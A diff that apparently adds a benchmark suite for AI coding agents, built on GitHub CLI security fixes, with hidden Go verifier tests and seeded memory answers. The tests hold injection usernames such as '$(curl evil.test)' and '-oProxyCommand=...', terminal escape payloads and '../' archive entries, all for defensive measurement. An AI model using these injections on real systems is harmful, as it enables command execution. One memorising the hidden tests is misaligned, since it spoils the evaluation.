@@ -1,0 +1,772 @@
+version: 1
+runner: task
+longitudinal: true
+name: lore-longitudinal-github-cli-security-v1
+description: >-
+  GitHub CLI security-hardening longitudinal suite. Each scenario reimplements a
+  real security-sensitive surface in cli/cli at the parent of an upstream fix.
+  Without the prior session's durable memory, a competent engineer ships code
+  that violates a specific non-inferable safety rule; seeded memory supplies the
+  rule and a hidden in-process Go test (mocked gRPC / httptest / temp-dir, no
+  live network) measures it.
+seededCorpus: ../vault-seeds/github-cli-security-v1.yaml
+conditions:
+  - no-memory
+  - seeded-lore
+  - lore-full-loop
+scenarios:
+  - id: gh-cli-codespace-ssh-username-arg-injection
+    difficulty: hard
+    agent: codex
+    timeoutMs: 1800000
+    workspace:
+      kind: git
+      repo: cli/cli
+      sha: e356c69a6f0125cfaac782c35acf77314f18908d
+    phaseA:
+      promptId: gh-cli-codespace-ssh-username-arg-injection-formation
+      prompt: "We will implement a follow-up to the codespace SSH connection flow in a later session. Inspect how `gh codespace ssh` and `gh codespace logs` obtain the SSH remote username from the codespace RPC server (`internal/codespaces/rpc`, `invoker.StartSSHServerWithOptions`, `response.User`), how that username is threaded into the local `ssh` command, and the existing mocked gRPC invoker tests. Produce a durable implementation plan only; do not edit files. The plan must resolve how the username returned by the server is handled before it is used to build the connection command."
+    phaseB:
+      promptId: gh-cli-codespace-ssh-username-arg-injection-use
+      prompt: "Implement the codespace SSH username handling follow-up exactly as planned in the prior investigation, wiring the SSH remote username from the RPC server through to the local connection command."
+    expectedContext:
+      description: "The SSH remote username returned by the codespace RPC server is untrusted and must be validated before being used to build the local ssh command, rejecting values that are not plain alphanumerics plus dot, underscore, and hyphen."
+      keywords:
+        - codespace
+        - ssh
+        - username
+        - invoker
+        - validate
+    seededContext:
+      renderedContext: "- [memory] gh-cli/codespace-ssh-username-validation: The SSH remote username returned by the codespace RPC server (`invoker.StartSSHServerWithOptions`, `response.User`) is attacker-controllable and must be treated as untrusted. Validate it against a strict alphanumeric-plus-`._-` pattern and return an `invalid username` error before using it to construct the local `ssh` command; otherwise a crafted username injects ssh options and runs arbitrary local commands (CVE-2024-52308)."
+      contextIds:
+        - gh-cli/codespace-ssh-username-validation
+    verifiers:
+      - type: patched-command
+        patch: |
+          diff --git a/internal/codespaces/rpc/hidden_ssh_username_test.go b/internal/codespaces/rpc/hidden_ssh_username_test.go
+          new file mode 100644
+          index 0000000..1111111
+          --- /dev/null
+          +++ b/internal/codespaces/rpc/hidden_ssh_username_test.go
+          @@ -0,0 +1,72 @@
+          +package rpc
+          +
+          +import (
+          +	"context"
+          +	"strings"
+          +	"testing"
+          +
+          +	"github.com/cli/cli/v2/internal/codespaces/rpc/ssh"
+          +)
+          +
+          +// hiddenStartSSHWithUser drives a poisoned SSH RPC response carrying the given
+          +// username through StartSSHServerWithOptions and reports the returned error.
+          +func hiddenStartSSHWithUser(t *testing.T, username string) error {
+          +	t.Helper()
+          +
+          +	server := newMockServer()
+          +	server.SshServerHostServerMock.StartRemoteServerAsyncFunc = func(context.Context, *ssh.StartRemoteServerRequest) (*ssh.StartRemoteServerResponse, error) {
+          +		return &ssh.StartRemoteServerResponse{
+          +			Result:     true,
+          +			ServerPort: "8022",
+          +			User:       username,
+          +			Message:    "",
+          +		}, nil
+          +	}
+          +
+          +	invoker, stop, err := createTestInvoker(t, server)
+          +	if err != nil {
+          +		t.Fatalf("error connecting to internal server: %v", err)
+          +	}
+          +	defer stop()
+          +
+          +	_, _, err = invoker.StartSSHServerWithOptions(context.Background(), StartSSHServerOptions{})
+          +	return err
+          +}
+          +
+          +func TestHiddenSSHUsernameRejectsAttackerControlledValues(t *testing.T) {
+          +	// These never appear verbatim in the feature prompt or seeded memory: the
+          +	// rule must be measured, not pattern-matched against example payloads.
+          +	poisoned := []string{
+          +		"-oProxyCommand=touch /tmp/owned",
+          +		"hubot rm",
+          +		"hubot;reboot",
+          +		"$(curl evil.test)",
+          +		"`id`",
+          +		"a\tb",
+          +		"user@host",
+          +		"a/b",
+          +		"",
+          +	}
+          +	for _, name := range poisoned {
+          +		t.Run("rejects "+name, func(t *testing.T) {
+          +			err := hiddenStartSSHWithUser(t, name)
+          +			if err == nil {
+          +				t.Fatalf("expected an error for attacker-controlled username %q, got nil (username was threaded through unvalidated)", name)
+          +			}
+          +			if !strings.Contains(strings.ToLower(err.Error()), "invalid username") {
+          +				t.Fatalf("expected an invalid-username error for %q, got: %v", name, err)
+          +			}
+          +		})
+          +	}
+          +}
+          +
+          +func TestHiddenSSHUsernameAcceptsBenignValues(t *testing.T) {
+          +	benign := []string{"octocat", "valid_user-1.x", "Mona.Lisa", "a"}
+          +	for _, name := range benign {
+          +		t.Run("accepts "+name, func(t *testing.T) {
+          +			err := hiddenStartSSHWithUser(t, name)
+          +			if err != nil {
+          +				t.Fatalf("expected benign username %q to be accepted, got error: %v", name, err)
+          +			}
+          +		})
+          +	}
+          +}
+        command: go
+        args:
+          - "test"
+          - "./internal/codespaces/rpc"
+          - "-run"
+          - "TestHiddenSSHUsername"
+          - "-count=1"
+        timeoutMs: 600000
+  - id: gh-cli-run-log-terminal-escape-sanitize
+    difficulty: hard
+    agent: codex
+    timeoutMs: 1800000
+    workspace:
+      kind: git
+      repo: cli/cli
+      sha: 3ad29588b8bf9f2390be652f46ee4ef75b875b03
+    phaseA:
+      promptId: gh-cli-run-log-terminal-escape-sanitize-formation
+      prompt: "We will implement a follow-up to workflow log viewing in a later session. Inspect how `gh run view --log` streams CI job logs to the terminal, particularly `copyLogWithLinePrefix` in `pkg/cmd/run/view`, where the log bytes originate, and the existing run-view tests. Produce a durable implementation plan only; do not edit files. The plan must resolve how arbitrary job-log content should be handled as it is written to the user's terminal."
+    phaseB:
+      promptId: gh-cli-run-log-terminal-escape-sanitize-use
+      prompt: "Implement the workflow log streaming follow-up exactly as planned in the prior investigation so that `gh run view --log` prints prefixed job log lines to the terminal."
+    expectedContext:
+      description: "Workflow job-log content is attacker-controllable and must be passed through the ascii sanitizer before reaching the terminal so raw ESC/CSI/OSC sequences cannot hijack it, while visible text and the line prefix are preserved."
+      keywords:
+        - run
+        - log
+        - terminal
+        - escape
+        - sanitize
+    seededContext:
+      renderedContext: "- [memory] gh-cli/run-log-terminal-escape-sanitize: Workflow/job log content is attacker-controllable and must never reach the terminal raw. In `copyLogWithLinePrefix` (and any path printing job logs) wrap the reader in `transform.NewReader(r, &asciisanitizer.Sanitizer{})` from `github.com/cli/go-gh/v2/pkg/asciisanitizer` so ESC/CSI/OSC sequences are converted to caret notation before display, preventing terminal-title hijack and escape-sequence injection."
+      contextIds:
+        - gh-cli/run-log-terminal-escape-sanitize
+    verifiers:
+      - type: patched-command
+        patch: |
+          diff --git a/pkg/cmd/run/view/hidden_log_escape_test.go b/pkg/cmd/run/view/hidden_log_escape_test.go
+          new file mode 100644
+          index 0000000..1111111
+          --- /dev/null
+          +++ b/pkg/cmd/run/view/hidden_log_escape_test.go
+          @@ -0,0 +1,67 @@
+          +package view
+          +
+          +import (
+          +	"bytes"
+          +	"strings"
+          +	"testing"
+          +
+          +	"github.com/stretchr/testify/assert"
+          +	"github.com/stretchr/testify/require"
+          +)
+          +
+          +func TestHiddenRunLogStripsTerminalEscapeSequences(t *testing.T) {
+          +	// Payloads differ from any example in the feature prompt or seeded memory so
+          +	// the sanitizer is measured rather than matched against known strings.
+          +	const esc = "\x1b"
+          +	cases := []struct {
+          +		name  string
+          +		input string
+          +	}{
+          +		{
+          +			name:  "osc window title hijack",
+          +			input: "BEGIN_LOG " + esc + "]0;OWNED_WINDOW" + "\x07" + " END_LOG\n",
+          +		},
+          +		{
+          +			name:  "csi sgr color run",
+          +			input: esc + "[32mGREEN_PAYLOAD" + esc + "[0m visible tail\n",
+          +		},
+          +		{
+          +			name:  "screen title set",
+          +			input: esc + "k;launch arbitrary tool;" + esc + "\\\n",
+          +		},
+          +		{
+          +			name:  "alt screen buffer decset",
+          +			input: "header " + esc + "[?1049h cleared " + esc + "[2J trailer\n",
+          +		},
+          +		{
+          +			name:  "combined sequences on one line",
+          +			input: esc + "]2;TITLE" + "\x07" + esc + "[31mX" + esc + "[0m" + esc + "[6n\n",
+          +		},
+          +	}
+          +
+          +	for _, tc := range cases {
+          +		t.Run(tc.name, func(t *testing.T) {
+          +			var buf bytes.Buffer
+          +			const prefix = "build\tcompile\t"
+          +			err := copyLogWithLinePrefix(&buf, strings.NewReader(tc.input), prefix)
+          +			require.NoError(t, err)
+          +
+          +			out := buf.String()
+          +			assert.NotContains(t, out, esc,
+          +				"raw ESC (0x1b) byte survived to the terminal: %q", out)
+          +			assert.Contains(t, out, prefix,
+          +				"line prefix should be preserved: %q", out)
+          +		})
+          +	}
+          +}
+          +
+          +func TestHiddenRunLogPreservesPlainText(t *testing.T) {
+          +	var buf bytes.Buffer
+          +	const prefix = "build\tcompile\t"
+          +	err := copyLogWithLinePrefix(&buf, strings.NewReader("ordinary log line one\nordinary log line two\n"), prefix)
+          +	require.NoError(t, err)
+          +
+          +	out := buf.String()
+          +	assert.Contains(t, out, "ordinary log line one")
+          +	assert.Contains(t, out, "ordinary log line two")
+          +}
+        command: go
+        args:
+          - "test"
+          - "./pkg/cmd/run/view"
+          - "-run"
+          - "TestHiddenRunLog"
+          - "-count=1"
+        timeoutMs: 600000
+  - id: gh-cli-redirect-cross-host-token-strip
+    difficulty: hard
+    agent: codex
+    timeoutMs: 1800000
+    workspace:
+      kind: git
+      repo: cli/cli
+      sha: 8c7935e6cec01cc910e40bad6ec9999508eb4d83
+    phaseA:
+      promptId: gh-cli-redirect-cross-host-token-strip-formation
+      prompt: "We will implement a follow-up to gh's API HTTP client in a later session. Inspect the auth round-tripper that attaches `Authorization: token <tok>` (`AddAuthTokenHeader`, `getHost` in `api/http_client.go`), how the underlying client follows redirects, and the existing http-client tests. Produce a durable implementation plan only; do not edit files. The plan must resolve how the auth header should behave when a request is an auto-followed redirect."
+    phaseB:
+      promptId: gh-cli-redirect-cross-host-token-strip-use
+      prompt: "Implement the API HTTP client auth round-tripper follow-up exactly as planned in the prior investigation, ensuring authenticated requests and their auto-followed redirects are handled correctly."
+    expectedContext:
+      description: "The auth round-tripper must only attach the token on the initial request or a redirect whose host equals the initial request's host, comparing host:port (URL.Host) not the bare hostname, so the token never leaks to a cross-host redirect target."
+      keywords:
+        - redirect
+        - auth
+        - token
+        - host
+        - round-tripper
+    seededContext:
+      renderedContext: "- [memory] gh-cli/redirect-cross-host-token-strip: In gh's auth round-tripper (`AddAuthTokenHeader`, `api/http_client.go`), only attach the `Authorization` token on the initial request or on a redirect whose host equals the initial request's host. Detect redirects via `req.Response.Request` and compare with `getHost`, which must return `URL.Host` (host:port) not `URL.Hostname()`. Never attach the token when the redirect host differs, or the credential leaks to the redirect target."
+      contextIds:
+        - gh-cli/redirect-cross-host-token-strip
+    verifiers:
+      - type: patched-command
+        patch: |
+          diff --git a/api/hidden_redirect_token_test.go b/api/hidden_redirect_token_test.go
+          new file mode 100644
+          index 0000000..1111111
+          --- /dev/null
+          +++ b/api/hidden_redirect_token_test.go
+          @@ -0,0 +1,97 @@
+          +package api
+          +
+          +import (
+          +	"fmt"
+          +	"net/http"
+          +	"net/http/httptest"
+          +	"strings"
+          +	"testing"
+          +
+          +	"github.com/stretchr/testify/assert"
+          +	"github.com/stretchr/testify/require"
+          +)
+          +
+          +// Two loopback httptest servers share hostname 127.0.0.1 but listen on
+          +// different ports. A redirect from one to the other is therefore a cross-host
+          +// redirect when host comparison uses URL.Host (host:port) and the auth token
+          +// must be stripped. A buggy comparison that uses URL.Hostname() treats them as
+          +// the same host; combined with a token configured under the bare hostname
+          +// (which a buggy getHost resolves the auto-followed redirect to) the credential
+          +// leaks to the redirect target.
+          +func TestHiddenAuthTokenStrippedOnCrossHostRedirect(t *testing.T) {
+          +	var targetRequest *http.Request
+          +	target := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+          +		targetRequest = r
+          +		w.WriteHeader(http.StatusNoContent)
+          +	}))
+          +	defer target.Close()
+          +
+          +	var entryRequest *http.Request
+          +	entry := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+          +		entryRequest = r
+          +		http.Redirect(w, r, target.URL, http.StatusFound)
+          +	}))
+          +	defer entry.Close()
+          +
+          +	hostKey := func(serverURL string) string {
+          +		return fmt.Sprintf("%s:oauth_token", strings.TrimPrefix(serverURL, "http://"))
+          +	}
+          +	// The bare-hostname key (no port) models a token configured for the host as
+          +	// gh stores it. A correct round-tripper keys auth off host:port and never
+          +	// matches an auto-followed cross-port redirect against it; a vulnerable one
+          +	// resolves the redirect to the bare hostname and attaches this secret.
+          +	bareHost := func(serverURL string) string {
+          +		hostPort := strings.TrimPrefix(serverURL, "http://")
+          +		return fmt.Sprintf("%s:oauth_token", hostPort[:strings.IndexByte(hostPort, ':')])
+          +	}
+          +
+          +	client, err := NewHTTPClient(HTTPClientOptions{
+          +		Config: tinyConfig{
+          +			hostKey(entry.URL):    "ENTRY-HOST-SECRET",
+          +			bareHost(target.URL):  "CROSS-HOST-LEAK-SECRET",
+          +		},
+          +	})
+          +	require.NoError(t, err)
+          +
+          +	req, err := http.NewRequest("GET", entry.URL, nil)
+          +	require.NoError(t, err)
+          +
+          +	res, err := client.Do(req)
+          +	require.NoError(t, err)
+          +	require.Equal(t, http.StatusNoContent, res.StatusCode)
+          +
+          +	// The initial request to the entry host is authenticated with its token.
+          +	assert.Equal(t, "token ENTRY-HOST-SECRET", entryRequest.Header.Get(authorization),
+          +		"the initial request should carry the entry host token")
+          +
+          +	// The auto-followed redirect lands on a different host (different port) and
+          +	// must NOT carry any auth token.
+          +	got := targetRequest.Header.Get(authorization)
+          +	assert.Empty(t, got,
+          +		"auth token must not be attached to a cross-host redirect, got: %q", got)
+          +}
+          +
+          +// A same-host redirect (identical host:port) must keep carrying the token.
+          +func TestHiddenAuthTokenRetainedOnSameHostRedirect(t *testing.T) {
+          +	hits := 0
+          +	var redirectedRequest *http.Request
+          +	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+          +		hits++
+          +		if r.URL.Path == "/final" {
+          +			redirectedRequest = r
+          +			w.WriteHeader(http.StatusNoContent)
+          +			return
+          +		}
+          +		http.Redirect(w, r, "/final", http.StatusFound)
+          +	}))
+          +	defer server.Close()
+          +
+          +	hostKey := fmt.Sprintf("%s:oauth_token", strings.TrimPrefix(server.URL, "http://"))
+          +	client, err := NewHTTPClient(HTTPClientOptions{
+          +		Config: tinyConfig{
+          +			hostKey: "SAME-HOST-SECRET",
+          +		},
+          +	})
+          +	require.NoError(t, err)
+          +
+          +	req, err := http.NewRequest("GET", server.URL+"/start", nil)
+          +	require.NoError(t, err)
+          +
+          +	res, err := client.Do(req)
+          +	require.NoError(t, err)
+          +	require.Equal(t, http.StatusNoContent, res.StatusCode)
+          +	require.GreaterOrEqual(t, hits, 2, "expected the redirect to be followed")
+          +
+          +	assert.Equal(t, "token SAME-HOST-SECRET", redirectedRequest.Header.Get(authorization),
+          +		"a same-host redirect should still carry the token")
+          +}
+        command: go
+        args:
+          - "test"
+          - "./api"
+          - "-run"
+          - "TestHiddenAuthToken"
+          - "-count=1"
+        timeoutMs: 600000
+  - id: gh-cli-auth-logout-credential-helper-reject
+    difficulty: hard
+    agent: codex
+    timeoutMs: 1800000
+    workspace:
+      kind: git
+      repo: cli/cli
+      sha: 9b505c3fb8c3e52100575adbad2da7c4714684d8
+    phaseA:
+      promptId: gh-cli-auth-logout-credential-helper-reject-formation
+      prompt: "We will implement a follow-up to `gh auth logout` in a later session. Inspect the logout command (`pkg/cmd/auth/logout`), how login's `auth setup-git` stores the token in the external git credential helper via the `gitcredentials.Updater`, the updater's reject/approve operations, and the existing logout tests. Produce a durable implementation plan only; do not edit files. The plan must resolve what state logout should leave behind across gh's own config and any external credential storage."
+    phaseB:
+      promptId: gh-cli-auth-logout-credential-helper-reject-use
+      prompt: "Implement the `gh auth logout` follow-up exactly as planned in the prior investigation so that logging out fully tears down the account's stored credentials."
+    expectedContext:
+      description: "Logout must purge the token from the external git credential helper by calling the gitcredentials updater Reject for the host, not just clear gh's keyring, and must treat a reject failure as a non-fatal warning rather than aborting logout."
+      keywords:
+        - auth
+        - logout
+        - credential
+        - reject
+        - helper
+    seededContext:
+      renderedContext: "- [memory] gh-cli/auth-logout-credential-reject: `gh auth logout` must purge the token from the external git credential helper, not just gh's keyring. During login (`auth setup-git`) the token is stored via `git credential approve`; on logout construct a `gitcredentials.Updater` and call `Reject(hostname)` (→ `git credential reject`) for the same host. Treat a Reject failure as a non-fatal warning (git may be missing) and never abort logout on it, or a usable token is left in osxkeychain/wincred after logout."
+      contextIds:
+        - gh-cli/auth-logout-credential-reject
+    verifiers:
+      - type: patched-command
+        patch: |
+          diff --git a/pkg/cmd/auth/logout/hidden_logout_credential_test.go b/pkg/cmd/auth/logout/hidden_logout_credential_test.go
+          new file mode 100644
+          index 0000000..1111111
+          --- /dev/null
+          +++ b/pkg/cmd/auth/logout/hidden_logout_credential_test.go
+          @@ -0,0 +1,155 @@
+          +package logout
+          +
+          +import (
+          +	"bytes"
+          +	"context"
+          +	"errors"
+          +	"fmt"
+          +	"os"
+          +	"path/filepath"
+          +	"strings"
+          +	"testing"
+          +
+          +	"github.com/MakeNowJust/heredoc"
+          +	"github.com/cli/cli/v2/git"
+          +	"github.com/cli/cli/v2/internal/config"
+          +	"github.com/cli/cli/v2/internal/gh"
+          +	"github.com/cli/cli/v2/pkg/cmdutil"
+          +	"github.com/cli/cli/v2/pkg/iostreams"
+          +	"github.com/google/shlex"
+          +	"github.com/stretchr/testify/require"
+          +)
+          +
+          +func hiddenIsolateGitWithStoreHelper(t *testing.T) string {
+          +	t.Helper()
+          +	dir := t.TempDir()
+          +	t.Setenv("GIT_CONFIG_GLOBAL", filepath.Join(dir, ".gitconfig"))
+          +	t.Setenv("GIT_CONFIG_NOSYSTEM", "true")
+          +	store := filepath.Join(dir, "credentials")
+          +	gc := &git.Client{}
+          +	cmd, err := gc.Command(context.Background(), "config", "--global", "--add",
+          +		"credential.helper", fmt.Sprintf("store --file %s", store))
+          +	require.NoError(t, err)
+          +	require.NoError(t, cmd.Run())
+          +	return store
+          +}
+          +
+          +func hiddenApproveCredential(t *testing.T, host, username, password string) {
+          +	t.Helper()
+          +	gc := &git.Client{}
+          +	cmd, err := gc.Command(context.Background(), "credential", "approve")
+          +	require.NoError(t, err)
+          +	cmd.Stdin = strings.NewReader(heredoc.Docf(`
+          +		protocol=https
+          +		host=%s
+          +		username=%s
+          +		password=%s
+          +	`, host, username, password))
+          +	require.NoError(t, cmd.Run())
+          +}
+          +
+          +func hiddenFillCredential(t *testing.T, host string) string {
+          +	t.Helper()
+          +	gc := &git.Client{}
+          +	cmd, err := gc.Command(context.Background(), "credential", "fill")
+          +	require.NoError(t, err)
+          +	cmd.Stdin = strings.NewReader(heredoc.Docf(`
+          +		protocol=https
+          +		host=%s
+          +	`, host))
+          +	out, err := cmd.Output()
+          +	require.NoError(t, err)
+          +	return string(out)
+          +}
+          +
+          +// hiddenReadStore returns the raw contents of the `store` credential helper's
+          +// backing file, or "" if it has been removed. The store helper persists
+          +// credentials as plaintext lines, so a purged token simply disappears from it.
+          +func hiddenReadStore(t *testing.T, store string) string {
+          +	t.Helper()
+          +	data, err := os.ReadFile(store)
+          +	if errors.Is(err, os.ErrNotExist) {
+          +		return ""
+          +	}
+          +	require.NoError(t, err)
+          +	return string(data)
+          +}
+          +
+          +// hiddenRunLogout drives logout through NewCmdLogout so the command wires its
+          +// own dependencies from the factory exactly as production does, then invokes the
+          +// real logoutRun against the captured options. The test never names any field
+          +// the command threads internally, so it compiles and runs against both the
+          +// vulnerable and fixed trees. Returns the IO stderr (where logout writes its
+          +// warnings) and the logoutRun error.
+          +func hiddenRunLogout(t *testing.T, cfg gh.Config, gitClient *git.Client, cli string) (string, error) {
+          +	t.Helper()
+          +	ios, _, _, ioStderr := iostreams.Test()
+          +	ios.SetStdinTTY(false)
+          +	ios.SetStdoutTTY(false)
+          +	ios.SetStderrTTY(false)
+          +	f := &cmdutil.Factory{
+          +		IOStreams: ios,
+          +		Config:    func() (gh.Config, error) { return cfg, nil },
+          +		GitClient: gitClient,
+          +	}
+          +	var captured *LogoutOptions
+          +	cmd := NewCmdLogout(f, func(opts *LogoutOptions) error {
+          +		captured = opts
+          +		return nil
+          +	})
+          +	// cobra reserves -h for help, but logout binds -h to --hostname; rebind help
+          +	// to avoid a shorthand collision panic when the command is executed.
+          +	cmd.Flags().BoolP("help", "x", false, "")
+          +	argv, err := shlex.Split(cli)
+          +	require.NoError(t, err)
+          +	cmd.SetArgs(argv)
+          +	cmd.SetIn(strings.NewReader(""))
+          +	var discard bytes.Buffer
+          +	cmd.SetOut(&discard)
+          +	cmd.SetErr(&discard)
+          +	_, err = cmd.ExecuteC()
+          +	require.NoError(t, err)
+          +	require.NotNil(t, captured, "logout command did not populate its options from the factory")
+          +	runErr := logoutRun(captured)
+          +	return ioStderr.String(), runErr
+          +}
+          +
+          +func TestHiddenLogoutPurgesExternalGitCredential(t *testing.T) {
+          +	const host = "github.com"
+          +	store := hiddenIsolateGitWithStoreHelper(t)
+          +	hiddenApproveCredential(t, host, "octocat", "stored-helper-token")
+          +
+          +	// Sanity: the credential is present in the external helper before logout.
+          +	require.Contains(t, hiddenFillCredential(t, host), "password=stored-helper-token")
+          +	require.Contains(t, hiddenReadStore(t, store), "stored-helper-token",
+          +		"precondition: token should be stored before logout")
+          +
+          +	cfg, _ := config.NewIsolatedTestConfig(t)
+          +	_, err := cfg.Authentication().Login(host, "octocat", "gh-internal-token", "https", false)
+          +	require.NoError(t, err)
+          +
+          +	_, err = hiddenRunLogout(t, cfg, &git.Client{}, "--hostname github.com --user octocat")
+          +	require.NoError(t, err)
+          +
+          +	// The external helper's backing store must no longer hold the token. We read
+          +	// the store file directly: once the credential is purged, a `git credential
+          +	// fill` would block on an interactive username prompt, so the file is the
+          +	// hermetic source of truth.
+          +	require.NotContains(t, hiddenReadStore(t, store), "stored-helper-token",
+          +		"token was left in the external git credential helper after logout")
+          +}
+          +
+          +func TestHiddenLogoutTreatsCredentialRejectFailureAsNonFatal(t *testing.T) {
+          +	const host = "github.com"
+          +	hiddenIsolateGitWithStoreHelper(t)
+          +
+          +	cfg, _ := config.NewIsolatedTestConfig(t)
+          +	_, err := cfg.Authentication().Login(host, "octocat", "gh-internal-token", "https", false)
+          +	require.NoError(t, err)
+          +
+          +	brokenGit := &git.Client{GitPath: filepath.Join(t.TempDir(), "definitely-not-git")}
+          +	stderr, err := hiddenRunLogout(t, cfg, brokenGit, "--hostname github.com --user octocat")
+          +	require.NoError(t, err, "a credential-helper reject failure must not abort logout")
+          +	require.Contains(t, strings.ToLower(stderr), "credential",
+          +		"expected a warning about the credential helper on stderr when reject fails: %q", stderr)
+          +}
+        command: go
+        args:
+          - "test"
+          - "./pkg/cmd/auth/logout"
+          - "-run"
+          - "TestHiddenLogout"
+          - "-count=1"
+        timeoutMs: 600000
+  - id: gh-cli-copilot-zip-slip-archive-path
+    difficulty: hard
+    agent: codex
+    timeoutMs: 1800000
+    workspace:
+      kind: git
+      repo: cli/cli
+      sha: 3b2072219fb25763e77aaee239c81c0e55acf7fb
+    phaseA:
+      promptId: gh-cli-copilot-zip-slip-archive-path-formation
+      prompt: "We will implement a follow-up to the `gh copilot` binary installer in a later session. Inspect how the copilot command downloads and extracts its release archive (`extractTarGz` and `extractZip` in `pkg/cmd/copilot/copilot.go`), how each entry name is joined onto the destination directory and written, and the existing copilot tests. Produce a durable implementation plan only; do not edit files. The plan must resolve how archive entry paths should be handled before files are written to disk."
+    phaseB:
+      promptId: gh-cli-copilot-zip-slip-archive-path-use
+      prompt: "Implement the copilot archive extraction follow-up exactly as planned in the prior investigation so that a downloaded tar.gz or zip release archive is extracted into the destination directory."
+    expectedContext:
+      description: "Each archive entry's resolved target must be validated to stay inside the destination directory before any file is written, rejecting `../` and absolute entry names with an illegal-path error, while benign entries extract normally."
+      keywords:
+        - copilot
+        - archive
+        - extract
+        - traversal
+        - zip-slip
+    seededContext:
+      renderedContext: "- [memory] gh-cli/copilot-archive-zip-slip: When extracting a downloaded archive (`extractTarGz`/`extractZip` in `pkg/cmd/copilot/copilot.go`), never write an entry without validating its path. Resolve `target := filepath.Join(destDir, entryName)` and require that the cleaned target stays within `destDir` (e.g. a HasPrefix check, or the shared safepaths helper); reject with an illegal-file-path error otherwise. This blocks Zip Slip / path traversal from `../` or absolute entry names in a malicious archive."
+      contextIds:
+        - gh-cli/copilot-archive-zip-slip
+    verifiers:
+      - type: patched-command
+        patch: |
+          diff --git a/pkg/cmd/copilot/hidden_zipslip_test.go b/pkg/cmd/copilot/hidden_zipslip_test.go
+          new file mode 100644
+          index 0000000..1111111
+          --- /dev/null
+          +++ b/pkg/cmd/copilot/hidden_zipslip_test.go
+          @@ -0,0 +1,137 @@
+          +package copilot
+          +
+          +import (
+          +	"archive/tar"
+          +	"archive/zip"
+          +	"bytes"
+          +	"compress/gzip"
+          +	"os"
+          +	"path/filepath"
+          +	"testing"
+          +)
+          +
+          +type hiddenArchiveEntry struct {
+          +	name string
+          +	body string
+          +}
+          +
+          +func hiddenBuildTarGz(t *testing.T, entries []hiddenArchiveEntry) []byte {
+          +	t.Helper()
+          +	var buf bytes.Buffer
+          +	gz := gzip.NewWriter(&buf)
+          +	tw := tar.NewWriter(gz)
+          +	for _, e := range entries {
+          +		hdr := &tar.Header{
+          +			Name:     e.name,
+          +			Mode:     0o644,
+          +			Size:     int64(len(e.body)),
+          +			Typeflag: tar.TypeReg,
+          +		}
+          +		if err := tw.WriteHeader(hdr); err != nil {
+          +			t.Fatalf("write tar header %q: %v", e.name, err)
+          +		}
+          +		if _, err := tw.Write([]byte(e.body)); err != nil {
+          +			t.Fatalf("write tar body %q: %v", e.name, err)
+          +		}
+          +	}
+          +	if err := tw.Close(); err != nil {
+          +		t.Fatalf("close tar: %v", err)
+          +	}
+          +	if err := gz.Close(); err != nil {
+          +		t.Fatalf("close gzip: %v", err)
+          +	}
+          +	return buf.Bytes()
+          +}
+          +
+          +func hiddenBuildZip(t *testing.T, entries []hiddenArchiveEntry) []byte {
+          +	t.Helper()
+          +	var buf bytes.Buffer
+          +	zw := zip.NewWriter(&buf)
+          +	for _, e := range entries {
+          +		w, err := zw.Create(e.name)
+          +		if err != nil {
+          +			t.Fatalf("create zip entry %q: %v", e.name, err)
+          +		}
+          +		if _, err := w.Write([]byte(e.body)); err != nil {
+          +			t.Fatalf("write zip entry %q: %v", e.name, err)
+          +		}
+          +	}
+          +	if err := zw.Close(); err != nil {
+          +		t.Fatalf("close zip: %v", err)
+          +	}
+          +	return buf.Bytes()
+          +}
+          +
+          +// hiddenEscapeCanary returns an absolute path just outside destDir that a Zip
+          +// Slip traversal would write to, plus the relative entry name that targets it.
+          +func hiddenEscapeCanary(t *testing.T, destDir string) (entryName, absTarget string) {
+          +	t.Helper()
+          +	parent := filepath.Dir(destDir)
+          +	canary := "hidden-zipslip-canary.txt"
+          +	abs := filepath.Join(parent, canary)
+          +	// Remove any stale canary so a false negative can't pass.
+          +	_ = os.Remove(abs)
+          +	// destDir is .../extract; the entry climbs one level into its parent.
+          +	return filepath.Join("..", canary), abs
+          +}
+          +
+          +func TestHiddenExtractTarGzRejectsPathTraversal(t *testing.T) {
+          +	base := t.TempDir()
+          +	dest := filepath.Join(base, "extract")
+          +	if err := os.MkdirAll(dest, 0o755); err != nil {
+          +		t.Fatal(err)
+          +	}
+          +	traversalName, canaryAbs := hiddenEscapeCanary(t, dest)
+          +
+          +	archive := hiddenBuildTarGz(t, []hiddenArchiveEntry{
+          +		{name: "sub/safe.txt", body: "ok"},
+          +		{name: traversalName, body: "pwned"},
+          +	})
+          +
+          +	err := extractTarGz(bytes.NewReader(archive), dest)
+          +	if err == nil {
+          +		t.Fatal("expected extractTarGz to reject a path-traversal entry, got nil")
+          +	}
+          +	if _, statErr := os.Stat(canaryAbs); statErr == nil {
+          +		t.Fatalf("traversal entry escaped the destination and wrote %s", canaryAbs)
+          +	}
+          +}
+          +
+          +func TestHiddenExtractZipRejectsPathTraversal(t *testing.T) {
+          +	base := t.TempDir()
+          +	dest := filepath.Join(base, "extract")
+          +	if err := os.MkdirAll(dest, 0o755); err != nil {
+          +		t.Fatal(err)
+          +	}
+          +	traversalName, canaryAbs := hiddenEscapeCanary(t, dest)
+          +
+          +	archive := hiddenBuildZip(t, []hiddenArchiveEntry{
+          +		{name: "sub/safe.txt", body: "ok"},
+          +		{name: traversalName, body: "pwned"},
+          +	})
+          +
+          +	err := extractZip(bytes.NewReader(archive), dest)
+          +	if err == nil {
+          +		t.Fatal("expected extractZip to reject a path-traversal entry, got nil")
+          +	}
+          +	if _, statErr := os.Stat(canaryAbs); statErr == nil {
+          +		t.Fatalf("traversal entry escaped the destination and wrote %s", canaryAbs)
+          +	}
+          +}
+          +
+          +func TestHiddenExtractTarGzAcceptsBenignArchive(t *testing.T) {
+          +	dest := t.TempDir()
+          +	archive := hiddenBuildTarGz(t, []hiddenArchiveEntry{
+          +		{name: "nested/dir/file.txt", body: "hello"},
+          +	})
+          +	if err := extractTarGz(bytes.NewReader(archive), dest); err != nil {
+          +		t.Fatalf("expected benign tar.gz to extract, got: %v", err)
+          +	}
+          +	got, err := os.ReadFile(filepath.Join(dest, "nested", "dir", "file.txt"))
+          +	if err != nil {
+          +		t.Fatalf("benign entry was not extracted: %v", err)
+          +	}
+          +	if string(got) != "hello" {
+          +		t.Fatalf("unexpected extracted content: %q", string(got))
+          +	}
+          +}
+        command: go
+        args:
+          - "test"
